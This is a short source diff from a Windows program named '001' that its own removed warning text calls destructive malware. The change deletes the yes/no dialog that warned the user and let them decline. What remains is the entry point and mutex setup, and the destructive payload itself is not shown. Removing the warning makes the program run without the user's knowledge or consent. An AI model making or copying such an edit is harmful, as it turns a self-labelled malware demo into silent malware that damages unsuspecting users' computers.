@@ -2,11 +2,6 @@
 
 ENTRY_POINT ( _001 )
 {
-if(MessageBoxW(NULL, 
-L"This is malware. Running it will destroy your computer, but do so at your own risk if you don't mind being destroyed. Click yes to run it",
-"WARNING - 001", MB_YESNO|MB_ICONWARNING)!=IDYES)
-return 0;
-
 	CreateMutexW ( NULL, TRUE, L"001.exe" );
 	if( GetLastError ( ) == ERROR_ALREADY_EXISTS )
 		return 3;
